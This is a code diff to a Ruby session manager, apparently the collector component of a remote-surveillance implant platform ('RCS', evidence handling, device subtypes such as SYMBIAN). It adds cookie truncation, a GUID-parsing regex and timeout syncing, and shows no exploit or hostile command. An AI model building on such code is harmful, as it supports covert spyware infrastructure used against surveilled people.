@@ -2,10 +2,10 @@
 #  Session Manager, manages all the cookies
 #
 
+require_relative 'evidence_manager'
+
 # from RCS::Common
 require 'rcs-common/trace'
-require 'rcs-common/evidence_manager'
-require 'rcs-common/flatsingleton'
 
 # system
 require 'uuidtools'
@@ -15,30 +15,49 @@ module Collector
 
 class SessionManager
   include Singleton
-  extend FlatSingleton
   include RCS::Tracer
 
   def initialize
     @sessions = {}
   end
 
-  def create(bid, build, instance, subtype, k)
+  def create(bid, ident, instance, subtype, k)
 
     # create a new random cookie
     #cookie = SecureRandom.random_bytes(8).unpack('H*').first
     cookie = UUIDTools::UUID.random_create.to_s
 
+    # backward compatibility fix because SYMBIAN 7.x has an internal buffer of 32 chars
+    # Giovanna owes me a beer... :)
+    cookie = cookie.slice(0..25) if subtype == 'SYMBIAN'
+
     # store the sessions
     @sessions[cookie] = {:bid => bid,
-                         :build => build,
+                         :ident => ident,
                          :instance => instance,
                          :subtype => subtype,
                          :key => k,
                          :cookie => cookie,
                          :time => Time.now,
-                         :count => 0}
+                         :count => 0,
+                         :total => 0}
 
     return cookie
+  end
+
+  def guid_from_cookie(cookie)
+    # this will match our GUID session cookie
+    re = '.*?(ID=)([A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12})'
+    m = Regexp.new(re, Regexp::IGNORECASE).match(cookie)
+
+    # we have to check for shorter cookie for backward compatibility SYMBIAN 7.x
+    # see above in the cookie creation
+    if m.nil?
+      re = '.*?(ID=)([A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{2})'
+      m = Regexp.new(re, Regexp::IGNORECASE).match(cookie)
+    end
+
+    return m.nil? ? m : m[2]
   end
 
   def check(cookie)
@@ -72,8 +91,8 @@ class SessionManager
         trace :info, "Session Timeout for [#{sess[:cookie]}]"
         
         # update the status accordingly
-        DB.sync_timeout sess
-        EvidenceManager.sync_timeout sess
+        DB.instance.sync_timeout sess
+        EvidenceManager.instance.sync_timeout sess
 
         # delete the entry
         @sessions.delete key
